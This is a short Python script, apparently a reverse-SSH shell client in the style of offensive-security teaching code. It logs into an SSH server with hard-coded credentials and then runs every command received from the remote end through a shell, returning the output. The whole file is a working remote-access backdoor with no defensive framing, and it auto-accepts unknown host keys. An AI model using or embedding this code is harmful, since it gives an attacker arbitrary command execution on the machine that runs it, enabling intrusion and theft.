import paramiko
import subprocess


def ssh_command(ip, user, passw, command):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(ip, username=user, password=passw)

    ssh_session = ssh_client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))

        while True:
            command = ssh_session.recv(1024).decode()

            try:
                print(f"execute: {command}")
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(f'Error exception: {e}')

    ssh_client.close()
    return


if __name__ == '__main__':
    ssh_command('127.0.0.1', 'admin', 'admin', 'ClientConnected')

